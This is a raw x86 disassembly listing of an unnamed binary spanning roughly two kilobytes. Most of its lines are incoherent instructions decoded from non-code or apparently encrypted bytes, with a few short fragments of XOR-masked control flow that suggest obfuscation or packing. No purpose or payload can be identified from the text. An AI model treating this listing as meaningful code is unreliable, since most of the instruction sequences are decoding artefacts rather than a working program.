  414901:	lea    edx,ds:0x7f6fa0bd
  414907:	push   edx
  414908:	(bad)  
  41490a:	daa    
  41490b:	pop    esp
  41490c:	pop    esp
  41490d:	rcl    DWORD PTR [ebp-0x44d32dfd],cl
  414913:	stos   BYTE PTR es:[edi],al
  414914:	dec    edx
  414915:	mov    ebp,0x61278b09
  41491a:	arpl   WORD PTR [ebx-0x143f852a],bx
  414920:	std    
  414921:	into   
  414922:	loopne 0x4148b1
  414924:	xor    dl,al
  414926:	cmp    al,0xf2
  414928:	or     DWORD PTR [edx-0x1],0xa96eecad
  41492f:	lahf   
  414930:	cmp    ecx,DWORD PTR ds:0x947cc3ce
  414936:	daa    
  414937:	int    0x92
  414939:	xchg   edx,eax
  41493a:	dec    ecx
  41493b:	inc    ebx
  41493c:	add    BYTE PTR [eax],dl
  41493e:	jbe    0x41493d
  414940:	iret   
  414941:	mov    eax,ds:0xcb81e81d
  414946:	pop    edx
  414947:	mov    ebp,0x489ff5a8
  41494c:	mov    al,ds:0x861d1a52
  414951:	dec    eax
  414952:	enter  0x6a55,0xde
  414956:	jg     0x41490a
  414958:	pusha  
  414959:	test   al,0x89
  41495b:	daa    
  41495c:	inc    esi
  41495d:	in     al,0x6b
  41495f:	xor    DWORD PTR [edi],edi
  414961:	inc    edi
  414962:	sub    cl,BYTE PTR [ebp-0x71]
  414965:	imul   ebx,DWORD PTR [ebx+ebx*8],0x9b76f7b6
  41496c:	or     WORD PTR [esi-0x686f52f0],dx
  414973:	(bad)  
  414975:	pop    es
  414976:	dec    edx
  414977:	retf   
  414978:	push   edx
  414979:	cmp    BYTE PTR [edx-0x40],al
  41497c:	or     BYTE PTR [esi+eiz*2],al
  41497f:	push   ds
  414980:	icebp  
  414981:	outs   dx,DWORD PTR ds:[esi]
  414982:	sbb    al,BYTE PTR [edx]
  414984:	adc    ecx,eax
  414986:	xchg   ebp,eax
  414987:	xor    DWORD PTR [edx+0x4881bc98],ebp
  41498d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41498e:	(bad)  
  41498f:	or     al,0x8f
  414991:	cli    
  414992:	adc    edx,ecx
  414994:	and    al,0xc6
  414996:	ret    0xc4f0
  414999:	jo     0x4149cd
  41499b:	pusha  
  41499c:	mov    ds:0x9d6fc157,al
  4149a1:	xor    DWORD PTR [ebp+0x16],ebp
  4149a4:	xchg   DWORD PTR [ebx+0x10],ecx
  4149a7:	and    al,0x2c
  4149a9:	xor    DWORD PTR ss:[edx+0x6f],0x37721768
  4149b1:	into   
  4149b2:	xchg   ebx,eax
  4149b3:	lods   al,BYTE PTR ds:[esi]
  4149b4:	call   0xf9a8ba0d
  4149b9:	push   cs
  4149ba:	dec    esi
  4149bb:	cdq    
  4149bc:	mov    dh,0x79
  4149be:	imul   ebx,DWORD PTR [edi],0xc0cc184e
  4149c4:	pop    ebp
  4149c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c6:	int    0x73
  4149c8:	out    0x72,al
  4149ca:	push   edi
  4149cb:	jae    0x414980
  4149cd:	pusha  
  4149ce:	add    al,0xd9
  4149d0:	lock cmp dl,BYTE PTR [eax]
  4149d3:	and    eax,0x8c934d37
  4149d8:	bound  ebx,QWORD PTR [ecx+0x7c89c1a0]
  4149de:	add    edi,ecx
  4149e0:	loope  0x414969
  4149e2:	in     eax,0x1
  4149e4:	enter  0x57f9,0x6f
  4149e8:	fs stos BYTE PTR es:[edi],al
  4149ea:	cmp    BYTE PTR [esi+0x5140bb6a],bl
  4149f0:	call   0xff9c99bd
  4149f5:	or     eax,0xbdc3ceec
  4149fa:	imul   ecx,DWORD PTR [ecx-0x71732df4],0x426840b5
  414a04:	out    dx,al
  414a05:	or     BYTE PTR [edi+0x18906642],dl
  414a0b:	mov    ds,WORD PTR [ebp-0x3cd6f09e]
  414a11:	pop    esp
  414a12:	add    eax,0x23cda618
  414a17:	(bad)  
  414a18:	xlat   BYTE PTR ds:[ebx]
  414a19:	xchg   esp,eax
  414a1a:	push   ss
  414a1b:	jae    0x414a24
  414a1d:	aam    0x36
  414a1f:	or     esp,DWORD PTR [esi+0x58ebc9b1]
  414a25:	int    0xd3
  414a27:	(bad)  
  414a28:	jbe    0x4149d4
  414a2a:	outs   dx,DWORD PTR ds:[esi]
  414a2b:	jl     0x4149ce
  414a2d:	push   eax
  414a2e:	outs   dx,BYTE PTR ds:[esi]
  414a2f:	mov    ds:0xeea4423b,al
  414a34:	hlt    
  414a35:	push   esi
  414a36:	or     ebx,DWORD PTR [esi+0x783c47ea]
  414a3c:	mov    esi,0xb19b80d1
  414a41:	repnz loopne 0x414a58
  414a44:	inc    edi
  414a45:	sbb    esi,DWORD PTR [esi-0x416fc533]
  414a4b:	popa   
  414a4c:	imul   ah
  414a4e:	sub    al,0x1f
  414a50:	div    DWORD PTR ds:0x47ebae08
  414a56:	sar    esp,1
  414a58:	clc    
  414a59:	ret    0x1125
  414a5c:	pop    ecx
  414a5d:	mov    BYTE PTR [edi-0x326680ea],cl
  414a63:	push   ebp
  414a64:	cmc    
  414a65:	out    dx,eax
  414a66:	mov    al,ds:0x98317a0b
  414a6b:	test   BYTE PTR [edx-0x64],al
  414a6e:	dec    ecx
  414a6f:	push   ecx
  414a70:	adc    dh,BYTE PTR [edi]
  414a72:	xor    esi,DWORD PTR [ecx+0x22]
  414a75:	lea    eax,[ecx-0x55b010e4]
  414a7b:	inc    esp
  414a7c:	sbb    BYTE PTR [eax+0x45],ah
  414a7f:	adc    al,0xb9
  414a81:	push   ss
  414a82:	and    esi,esi
  414a84:	dec    edi
  414a85:	out    0x9e,al
  414a87:	mov    edx,0xacc8fb0c
  414a8c:	mov    al,ds:0x502576d2
  414a91:	xchg   BYTE PTR [edx+0x174c8bcf],dl
  414a97:	jb     0x414a9f
  414a99:	aaa    
  414a9a:	sub    DWORD PTR [esi+0x1],0xf0df7ced
  414aa1:	xor    al,0xb3
  414aa3:	or     DWORD PTR [edi+0x78],eax
  414aa6:	jge    0x414a48
  414aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa9:	push   ebp
  414aaa:	adc    edi,DWORD PTR [eax-0x52]
  414aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aae:	jle    0x414a3e
  414ab0:	popf   
  414ab1:	pop    ds
  414ab2:	fild   DWORD PTR [ebx-0x3c]
  414ab5:	maskmovq mm5,(bad)
  414ab6:	imul   DWORD PTR [esi-0x2809b724]
  414abc:	popf   
  414abd:	(bad)  
  414abe:	fist   DWORD PTR [edx+0x1b]
  414ac1:	mov    esi,0x7cd782f4
  414ac6:	mov    dl,bh
  414ac8:	pop    eax
  414ac9:	inc    edx
  414aca:	sbb    DWORD PTR [esi+0x45e55567],0xaba95410
  414ad4:	mov    ah,0x81
  414ad6:	push   esi
  414ad7:	into   
  414ad8:	(bad)  
  414ad9:	ret    
  414ada:	(bad)  
  414adc:	push   esi
  414add:	fidiv  WORD PTR [esi-0x4639ee44]
  414ae3:	cmp    ebp,DWORD PTR [edi]
  414ae5:	arpl   WORD PTR [eax-0x3d],cx
  414ae8:	pop    edx
  414ae9:	call   0x9546:0x751950cd
  414af0:	mov    ebp,DWORD PTR [ecx+0x36]
  414af3:	pop    edx
  414af4:	aaa    
  414af5:	jmp    0x414b40
  414af7:	sbb    ebp,0x7c
  414afa:	(bad)  
  414afb:	fnstsw WORD PTR [edx+0x53]
  414afe:	outs   dx,BYTE PTR ds:[esi]
  414aff:	(bad)  
  414b00:	pusha  
  414b01:	cmp    DWORD PTR [eax-0x6a356b87],esp
  414b07:	and    edx,edi
  414b09:	arpl   WORD PTR [eax-0x44],di
  414b0c:	or     al,0x8d
  414b0e:	imul   edx,esi,0x9639ff74
  414b14:	pop    ss
  414b15:	mov    esp,0x4f59f1db
  414b1a:	and    DWORD PTR [edx+eax*1+0x75],0xabd21d82
  414b22:	pusha  
  414b23:	(bad)  
  414b24:	pop    ecx
  414b25:	out    0xac,eax
  414b27:	mov    ch,0x25
  414b29:	sbb    BYTE PTR [edi+edx*2],bl
  414b2c:	dec    eax
  414b2d:	pop    edx
  414b2e:	stos   BYTE PTR es:[di],al
  414b30:	push   esi
  414b31:	dec    edi
  414b32:	fild   DWORD PTR [ebx]
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	pop    esp
  414bb7:	xor    eax,0x7b5b6088
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0xe470707e
  414bc3:	push   eax
  414bc4:	and    al,0x9f
  414bc6:	les    esp,FWORD PTR [eax-0x20]
  414bc9:	lods   al,BYTE PTR ds:[esi]
  414bca:	and    dl,cl
  414bcc:	dec    ecx
  414bcd:	dec    ecx
  414bce:	jg     0x414b6c
  414bd0:	jge    0x414be4
  414bd2:	jno    0x414c06
  414bd4:	pop    ebx
  414bd5:	aam    0x74
  414bd7:	or     BYTE PTR [ecx-0x3f801e4a],ah
  414bdd:	jo     0x414b97
  414bdf:	call   0xb13d:0x3ac08c70
  414be6:	fisubr WORD PTR [edi+0x52]
  414be9:	and    dh,dl
  414beb:	mov    al,ds:0x86654a63
  414bf0:	or     al,0xf1
  414bf2:	and    DWORD PTR [edi+ebx*8+0x78],esi
  414bf6:	pop    ds
  414bf7:	adc    eax,0xa29be10d
  414bfc:	scas   eax,DWORD PTR es:[edi]
  414bfd:	pushf  
  414bfe:	add    al,0x43
  414c00:	add    DWORD PTR ss:[esi],edx
  414c03:	test   eax,0xd1266303
  414c08:	adc    ah,al
  414c0a:	jge    0x414c3e
  414c0c:	mov    WORD PTR [ecx+ebp*4-0x495c84ef],?
  414c13:	arpl   bp,bx
  414c15:	aaa    
  414c16:	lods   eax,DWORD PTR ds:[esi]
  414c17:	jnp    0x414bd8
  414c19:	cmc    
  414c1a:	es jge 0x414c17
  414c1d:	in     eax,0x17
  414c1f:	cmp    ecx,DWORD PTR [ebx]
  414c21:	fimul  WORD PTR [ebx]
  414c23:	xchg   ecx,eax
  414c24:	call   0x1795:0x750bdb04
  414c2b:	or     al,0x42
  414c2d:	sub    eax,0xea48e0cd
  414c32:	(bad)  [ebx-0x68]
  414c35:	sbb    BYTE PTR [ebx-0x53],0x96
  414c39:	push   ebp
  414c3a:	test   eax,0xfb835b56
  414c3f:	and    BYTE PTR [ebp+0x5a669703],cl
  414c45:	jo     0x414cad
  414c47:	pop    eax
  414c48:	stos   BYTE PTR es:[di],al
  414c4a:	(bad)  
  414c4b:	adc    ah,bl
  414c4d:	div    DWORD PTR [ecx-0x5a5ab483]
  414c53:	aam    0x4
  414c55:	rol    DWORD PTR [ecx-0x35],cl
  414c58:	cmc    
  414c59:	fisttp QWORD PTR [edi+ebx*4]
  414c5c:	push   esp
  414c5d:	test   ebp,ebp
  414c5f:	sbb    ebp,DWORD PTR [edx-0x61]
  414c62:	inc    esp
  414c63:	leave  
  414c64:	cld    
  414c65:	xchg   ebp,eax
  414c66:	cmp    cl,BYTE PTR [edi-0x7f50f369]
  414c6c:	idiv   BYTE PTR [ebp-0x3b]
  414c6f:	scas   al,BYTE PTR es:[edi]
  414c70:	push   edi
  414c71:	or     BYTE PTR [edx+0x5b],al
  414c74:	jns    0x414c57
  414c76:	nop
  414c77:	out    dx,al
  414c78:	dec    esi
  414c7a:	repz icebp 
  414c7c:	cmp    DWORD PTR [eax+0x2d],ecx
  414c7f:	int    0x91
  414c81:	aad    0x69
  414c83:	shr    DWORD PTR [edx+0x76],cl
  414c86:	test   DWORD PTR [edx-0x325d4c3],ebp
  414c8c:	jmp    0xb2f7b7d5
  414c91:	fimul  DWORD PTR [ecx]
  414c93:	jge    0x414ce3
  414c95:	mov    edi,DWORD PTR [esp+eiz*2]
  414c98:	cmp    edi,DWORD PTR [eax+0x1aff8afe]
  414c9e:	pop    edx
  414c9f:	and    esi,DWORD PTR [esi-0x49]
  414ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca3:	js     0x414ce7
  414ca5:	outs   dx,DWORD PTR ds:[esi]
  414ca6:	dec    edi
  414ca7:	push   ds
  414ca8:	and    al,0xc3
  414caa:	inc    edx
  414cab:	mov    bl,0xbc
  414cad:	repnz mov dl,0x6a
  414cb0:	mov    ecx,0x62202d3c
  414cb5:	int3   
  414cb6:	mov    ah,0x24
  414cb8:	arpl   WORD PTR [edi],di
  414cba:	add    eax,0xece9fe6c
  414cbf:	push   ds
  414cc0:	jns    0x414cee
  414cc2:	push   cs
  414cc3:	cmp    al,0x51
  414cc5:	dec    edx
  414cc6:	iret   
  414cc7:	pop    esp
  414cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cc9:	cdq    
  414cca:	call   FWORD PTR [ebp+0x1d758bc2]
  414cd0:	push   0x93cc428d
  414cd5:	popf   
  414cd6:	adc    al,ch
  414cd8:	jo     0x414ca0
  414cda:	jle    0x414c9e
  414cdc:	jno    0x414d1b
  414cde:	inc    eax
  414cdf:	aad    0x62
  414ce1:	push   0xd24aebf5
  414ce6:	daa    
  414ce7:	int3   
  414ce8:	pop    ecx
  414ce9:	ja     0x414d2b
  414ceb:	jo     0x414d09
  414ced:	lock xor al,0xbb
  414cf0:	jnp    0x414cf2
  414cf2:	jbe    0x414d0f
  414cf4:	imul   cx,WORD PTR [ecx+0x3f],0x23b7
  414cfa:	sbb    BYTE PTR [ecx],dl
  414cfc:	bound  ebp,QWORD PTR ds:0x2f8f1f16
  414d02:	sub    bl,0x78
  414d05:	pushf  
  414d06:	mov    ss,WORD PTR [esi+0x3ecf1e1e]
  414d0c:	out    0xbd,eax
  414d0e:	inc    ebx
  414d0f:	xor    cl,BYTE PTR [ebx]
  414d11:	in     eax,dx
  414d12:	lahf   
  414d13:	inc    esi
  414d14:	imul   ebx,DWORD PTR [edx+0x395fecd],0x95c9702d
  414d1e:	push   ebp
  414d1f:	(bad)  
  414d20:	xchg   ecx,eax
  414d21:	jge    0x414d25
  414d23:	xchg   edi,eax
  414d24:	push   cs
  414d25:	div    DWORD PTR [edi+0x19fc3ffd]
  414d2b:	int    0x56
  414d2d:	mov    eax,ds:0x5af94548
  414d32:	add    ebp,DWORD PTR [edi+0x7e]
  414d35:	jbe    0x414d25
  414d37:	sbb    ah,BYTE PTR [ebx]
  414d39:	inc    ecx
  414d3a:	pushf  
  414d3b:	nop
  414d3c:	into   
  414d3d:	imul   ebp,DWORD PTR [esi],0xc
  414d40:	push   esi
  414d41:	inc    edi
  414d42:	push   ss
  414d43:	cli    
  414d44:	jecxz  0x414d09
  414d46:	mov    eax,0x43196b23
  414d4b:	pop    ecx
  414d4c:	mov    cl,0x1f
  414d4e:	(bad)  
  414d4f:	aam    0x5a
  414d51:	push   es
  414d52:	sbb    eax,0x3033e53d
  414d57:	pop    ebp
  414d58:	addr16 push eax
  414d5a:	nop
  414d5b:	in     al,dx
  414d5c:	jmp    0x90c6:0xb5dc23c2
  414d63:	dec    ebp
  414d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d65:	arpl   ax,cx
  414d67:	sub    cl,ch
  414d69:	adc    ch,BYTE PTR [ecx-0x1f]
  414d6c:	cmovns ebp,DWORD PTR [edi]
  414d6f:	push   ebp
  414d70:	cdq    
  414d71:	xor    edx,ebp
  414d73:	lods   eax,DWORD PTR ds:[esi]
  414d74:	mov    bh,0xa8
  414d76:	je     0x414d36
  414d78:	mov    dh,0x3d
  414d7a:	add    al,0xfa
  414d7c:	lea    edi,[edi+0x59]
  414d7f:	and    al,0x16
  414d81:	push   esp
  414d82:	fcos   
  414d84:	int3   
  414d85:	add    BYTE PTR [edx+0x31],al
  414d88:	or     DWORD PTR [edi-0x68],eax
  414d8b:	sbb    ebp,esi
  414d8d:	mov    ah,0xbf
  414d8f:	sahf   
  414d90:	dec    esp
  414d91:	jle    0x414d1a
  414d93:	scas   eax,DWORD PTR es:[edi]
  414d94:	sbb    eax,0xeac95d30
  414d99:	daa    
  414d9a:	lea    edi,[esi]
  414d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d9d:	inc    DWORD PTR [edx+0x2bc6c146]
  414da3:	push   0xab370ba0
  414da8:	hlt    
  414da9:	popa   
  414daa:	sbb    dl,BYTE PTR [edi]
  414dac:	jno    0x414d9a
  414dae:	jne    0x414e26
  414db0:	jmp    0x414d90
  414db2:	add    BYTE PTR [eax],al
  414db4:	inc    edi
  414db5:	in     al,0x6f
  414db7:	imul   edi,eax,0x7f
  414dba:	jmp    0x414dd7
  414dbc:	imul   ebx,esi,0x6b
  414dbf:	cli    
  414dc0:	pop    ecx
  414dc1:	add    eax,0x73168e7a
  414dc6:	(bad)  
  414dc8:	lods   al,BYTE PTR ds:[esi]
  414dc9:	out    dx,eax
  414dca:	shl    BYTE PTR [ebx],1
  414dcc:	ins    BYTE PTR es:[edi],dx
  414dcd:	push   cs
  414dce:	inc    eax
  414dcf:	mov    edi,0x3c5d01af
  414dd4:	sbb    BYTE PTR [edx-0x5707a1c6],al
  414dda:	ja     0x414d6f
  414ddc:	push   eax
  414ddd:	and    BYTE PTR [edx],dl
  414ddf:	push   0x59
  414de1:	inc    esi
  414de2:	add    al,0xaf
  414de4:	or     esi,edx
  414de6:	xchg   esp,edx
  414de8:	sbb    al,0x7a
  414dea:	jnp    0x414d95
  414dec:	lods   eax,DWORD PTR ds:[esi]
  414ded:	mov    fs,WORD PTR [eax+0x91b6e9a]
  414df3:	shl    DWORD PTR [esp+esi*2-0x50],cl
  414df7:	adc    DWORD PTR [edx+0x10467e67],edi
  414dfd:	push   es
  414dfe:	scas   al,BYTE PTR es:[edi]
  414dff:	aad    0x50
  414e01:	mov    ah,0xa8
  414e03:	add    BYTE PTR [edi+0x21],bh
  414e06:	push   0x49
  414e08:	mov    al,ds:0xa2e9f064
  414e0d:	icebp  
  414e0e:	popa   
  414e0f:	stos   DWORD PTR es:[edi],eax
  414e10:	cmp    ah,ch
  414e12:	pop    ebp
  414e13:	out    0x6d,eax
  414e15:	sub    edx,0x20
  414e18:	jmp    0x14aa:0x3d08a4aa
  414e1f:	fs out 0x90,eax
  414e22:	cmp    eax,0xd3643aaf
  414e27:	data16 and BYTE PTR [edx+0x79],ch
  414e2b:	and    BYTE PTR [eax-0xd],ch
  414e2e:	fcom   QWORD PTR [esi]
  414e30:	test   bh,ah
  414e32:	test   al,0x1c
  414e34:	jmp    0x140b2cf2
  414e39:	cdq    
  414e3a:	nop
  414e3b:	inc    ebx
  414e3c:	or     dl,al
  414e3e:	pop    ds
  414e3f:	cmp    DWORD PTR [edx+0x284cc76],esp
  414e45:	jne    0x414eb5
  414e47:	fcom   QWORD PTR [ecx+0x6e]
  414e4a:	in     eax,dx
  414e4b:	in     al,0xb3
  414e4d:	lods   al,BYTE PTR ds:[esi]
  414e4e:	inc    ebp
  414e4f:	mov    ebp,0x52e2e665
  414e54:	push   edx
  414e55:	push   eax
  414e56:	adc    eax,0xbc548699
  414e5b:	push   edi
  414e5c:	or     al,0x96
  414e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e5f:	ss jae 0x414ea0
  414e62:	scas   al,BYTE PTR es:[edi]
  414e63:	int    0xe6
  414e65:	sbb    dl,dh
  414e67:	push   ss
  414e68:	call   0x389ad548
  414e6d:	cmp    DWORD PTR [ebx+0x4a],edx
  414e70:	stos   DWORD PTR es:[edi],eax
  414e71:	mov    eax,0x27f45061
  414e76:	data16 mov dl,0x8
  414e79:	adc    BYTE PTR [edi-0x715774bb],bl
  414e7f:	push   ecx
  414e80:	mov    gs,WORD PTR [ecx]
  414e82:	inc    edx
  414e83:	or     edx,ebx
  414e85:	jno    0x414e34
  414e87:	sbb    edi,DWORD PTR [esi+0x49056a59]
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	inc    ebp
  414ead:	scas   eax,DWORD PTR es:[edi]
  414eae:	popa   
  414eaf:	aaa    
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414f2e
  414eb9:	enter  0xeecb,0xcf
  414ebd:	adc    DWORD PTR [edi],ebp
  414ebf:	dec    esi
  414ec0:	jecxz  0x414ee4
  414ec2:	push   ebx
  414ec3:	sub    al,al
  414ec5:	adc    BYTE PTR [edx-0x7affb4f0],dh
  414ecb:	pop    ss
  414ecc:	pop    ebx
  414ecd:	jmp    0x414e74
  414ecf:	gs leave 
  414ed1:	pop    edx
  414ed2:	es xchg esp,eax
  414ed4:	xor    DWORD PTR [ebx],edx
  414ed6:	mov    bh,0xb9
  414ed8:	lods   eax,DWORD PTR ds:[esi]
  414ed9:	jno    0x414f20
  414edb:	iret   
  414edc:	cld    
  414edd:	jmp    0x5782:0x74a992f1
  414ee4:	(bad)  
  414ee5:	jns    0x414f1c
  414ee7:	inc    esp
  414ee8:	gs aaa 
  414eea:	sbb    al,0x72
  414eec:	dec    ebx
  414eed:	push   eax
  414eee:	adc    ecx,ebp
  414ef0:	lock out 0x86,eax
  414ef3:	dec    esi
  414ef4:	shl    al,cl
  414ef6:	sub    ch,BYTE PTR [ecx+0x33]
  414ef9:	pop    ds
  414efa:	into   
  414efb:	(bad)  
  414efc:	jecxz  0x414ef6
  414efe:	in     eax,dx
  414eff:	call   0x37d2:0x1b0310ac
  414f06:	and    bl,BYTE PTR [edi-0xa]
  414f09:	push   0xe1f7c8ff
  414f0e:	mov    cs,WORD PTR [edi+0x5d]
  414f11:	sub    bl,ah
  414f13:	cli    
  414f14:	adc    eax,0xd260f141
  414f19:	inc    eax
  414f1a:	iret   
  414f1b:	push   0x779accfa
  414f20:	aaa    
  414f21:	jmp    0x414f75
  414f23:	xor    DWORD PTR [ebx-0x4e],ebx
  414f26:	inc    eax
  414f27:	push   cs
  414f28:	mov    BYTE PTR [eax-0xb],bl
  414f2b:	jb     0x414f85
  414f2d:	push   ebx
  414f2e:	mov    esp,0x158939e
  414f33:	ret    
  414f34:	cmp    eax,0xa60e33ec
  414f39:	(bad)  
  414f3a:	shl    DWORD PTR [ebx+edi*4-0x25],1
  414f3e:	ss mov ecx,0x2052a6
  414f44:	aas    
  414f45:	adc    eax,0xb07211bc
  414f4a:	jg     0x414f59
  414f4c:	data16 aaa 
  414f4e:	mov    ch,bh
  414f50:	outs   dx,DWORD PTR ds:[esi]
  414f51:	lahf   
  414f52:	mov    dh,0xf3
  414f54:	push   esi
  414f55:	push   esi
  414f56:	mov    ?,eax
  414f58:	inc    ecx
  414f59:	xchg   edx,eax
  414f5a:	in     eax,dx
  414f5b:	ror    BYTE PTR [eax+eiz*4+0x3e],cl
  414f5f:	mov    ds:0xe2ed75d9,eax
  414f64:	je     0x414f9b
  414f66:	jno    0x414f19
  414f68:	lahf   
  414f69:	sbb    ch,dh
  414f6b:	push   cs
  414f6c:	fimul  DWORD PTR ds:0xe6867f89
  414f72:	ja     0x414fd0
  414f74:	mov    bh,0x91
  414f76:	shl    DWORD PTR [edx+eiz*4+0x2526302f],0xe9
  414f7e:	pop    edx
  414f7f:	retf   0x1f60
  414f82:	jne    0x414fa3
  414f84:	cmp    al,0xdf
  414f86:	aaa    
  414f87:	(bad)  
  414f88:	das    
  414f89:	push   0xffffff84
  414f8b:	loope  0x414f51
  414f8d:	sbb    eax,0x623c6c17
  414f92:	icebp  
  414f93:	pop    esi
  414f94:	cmp    eax,0xe95f71fb
  414f99:	xor    al,0xb0
  414f9b:	xor    BYTE PTR [esi+0x78ef08e2],0x66
  414fa2:	sub    edx,esi
  414fa4:	repz daa 
  414fa6:	mov    cl,0x2
  414fa8:	add    BYTE PTR [ebx+esi*8+0x67168c72],dl
  414faf:	daa    
  414fb0:	fcmovu st,st(1)
  414fb2:	sti    
  414fb3:	inc    edi
  414fb4:	icebp  
  414fb5:	loopne 0x414ff1
  414fb7:	dec    ecx
  414fb8:	add    DWORD PTR [ecx+0x18],0xffffffb5
  414fbc:	les    esp,FWORD PTR [ecx+0x4a57b2c0]
  414fc2:	dec    esi
  414fc3:	pop    ds
  414fc4:	data16 sub al,0x9
  414fc7:	rcr    BYTE PTR [edx],0xaf
  414fca:	shl    BYTE PTR [esi],0x43
  414fcd:	ret    0x7a03
  414fd0:	pusha  
  414fd1:	mov    dh,0xd4
  414fd3:	rcr    eax,cl
  414fd5:	dec    edi
  414fd6:	fsub   QWORD PTR [ecx-0x78]
  414fd9:	xor    DWORD PTR [ebp+0x466065a],esp
  414fdf:	into   
  414fe0:	dec    esi
  414fe1:	(bad)  
  414fe2:	sbb    DWORD PTR [eax+edi*2],edi
  414fe5:	pop    ebx
  414fe6:	inc    edi
  414fe7:	and    al,bl
  414fe9:	addr16 adc al,0x95
  414fec:	ins    DWORD PTR es:[edi],dx
  414fed:	cmp    BYTE PTR [edi],bl
  414fef:	xor    DWORD PTR [ebp+0x8],esi
  414ff2:	mov    BYTE PTR [edi+0x27],al
  414ff5:	add    al,0x23
  414ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff8:	mov    ebx,0x1ab517c4
  414ffd:	dec    ebp
  414ffe:	stos   BYTE PTR es:[edi],al
  414fff:	inc    ecx
  415000:	mov    edi,ebp
  415002:	pop    ebx
  415003:	je     0x414ffa
  415005:	aad    0x17
  415007:	cmp    DWORD PTR [ecx+0x23bfbebe],esi
  41500d:	xchg   ebx,eax
  41500e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41500f:	mov    al,0xfb
  415011:	(bad)  
  415012:	nop
  415013:	adc    al,0xd2
  415015:	into   
  415016:	sbb    BYTE PTR ds:0xffc6271a,bh
  41501c:	stos   DWORD PTR es:[edi],eax
  41501d:	sbb    al,0x80
  41501f:	into   
  415020:	push   esp
  415021:	mov    ebx,0xbdc81bf4
  415026:	cld    
  415027:	rcl    bh,cl
  415029:	adc    DWORD PTR [esi-0x1a],edi
  41502c:	or     DWORD PTR [ebp+0x7454c17],0xffffffcc
  415033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415034:	jp     0x415071
  415036:	xchg   edx,eax
  415037:	or     DWORD PTR [ebx-0x1f593fee],edx
  41503d:	nop
  41503e:	xchg   edi,eax
  41503f:	bound  ebx,QWORD PTR [edi]
  415041:	jb     0x415055
  415043:	mov    bl,0xee
  415045:	(bad)  
  415046:	mov    eax,ds:0xf4d99539
  41504b:	imul   esi,DWORD PTR [edx+0x17],0xbdd61659
  415052:	in     eax,dx
  415053:	(bad)  
  415054:	stc    
  415055:	clc    
  415056:	sub    dh,ah
  415058:	ins    DWORD PTR es:[edi],dx
  415059:	mov    DWORD PTR [ecx+0x67],ebx
  41505c:	push   ecx
  41505d:	xor    dh,ah
  41505f:	mov    WORD PTR [ebx],ds
  415061:	sub    DWORD PTR [ecx+0x6396368b],ecx
  415067:	fstp   QWORD PTR [esi]
  415069:	hlt    
  41506a:	loop   0x41505f
  41506c:	mov    esp,0x13b86c4c
  415071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415072:	rcl    DWORD PTR [ebp-0x77ac1bf1],cl
  415078:	(bad)  
  415079:	dec    esp
  41507a:	aaa    
  41507b:	inc    esi
  41507c:	fld    QWORD PTR [esi+0x70ccdc5b]
  415082:	cmp    eax,0xf41e0f8e
  415087:	sbb    edi,eax
  415089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41508a:	mov    edx,0x5ad4944a
  41508f:	and    al,0x45
  415091:	push   ecx
  415092:	sub    esp,DWORD PTR [edx]
  415094:	loop   0x415027
  415096:	fdiv   QWORD PTR [esi]
  415098:	add    BYTE PTR [esi+0x54],dh
